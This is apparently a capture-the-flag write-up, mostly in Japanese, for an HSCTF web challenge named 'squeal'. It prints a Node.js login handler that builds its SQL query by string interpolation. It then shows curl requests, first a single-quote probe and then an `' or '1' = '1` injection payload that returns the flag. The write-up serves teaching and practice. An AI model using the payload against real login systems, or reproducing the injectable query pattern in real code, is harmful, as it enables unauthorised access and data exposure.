# squeal:web:219pts
Can you log into this super secret site as admin? It's okay to SQueaL  
[http://web1.hsctf.com:8006/](http://web1.hsctf.com:8006/)  
Downloads  
[squeal.zip](squeal.zip)  

# Solution
URLとソースが渡される。  
アクセスするとログインフォームが現れる。  
Login  
[site.png](site/site.png)  
SQLiがあやしい。  
ソースを見ると以下のようであった。  
```js
~~~
app.post("/api/flag", (req, res) => {
	const username = req.body.username;
	const password = req.body.password;
	if (typeof username !== "string") {
		res.status(400);
		res.end();
		return;
	}
	if (typeof password !== "string") {
		res.status(400);
		res.end();
		return;
	}

	let result;
	try {
		result = db
			.prepare(
				`SELECT * FROM users
            WHERE username = '${username}'
            AND password = '${password}';`
			)
			.get();
	} catch (error) {
		res.json({ success: false, error: "There was a problem." });
		res.end();
		return;
	}

	if (result) {
		res.json({ success: true, flag: process.env.FLAG });
		res.end();
		return;
	}

	res.json({ success: false, error: "Incorrect username or password." });
});
~~~
```
自明なSQLiが見て取れる。  
```bash
$ curl http://web1.hsctf.com:8006/api/flag -H 'Content-Type: application/json' --data-raw $'{"username":"\'","password":"satoki"}'
{"success":false,"error":"There was a problem."}
$ curl http://web1.hsctf.com:8006/api/flag -H 'Content-Type: application/json' --data-raw $'{"username":"\' or \'1\' = \'1","password":"\' or \'1\' = \'1"}'
{"success":true,"flag":"flag{squ34l_n0t_sql}"}
```
シングルクォートでエラーになることからも明らかである。  
基本的なペイロードを投げてやるとflagが得られた。  

## flag{squ34l_n0t_sql}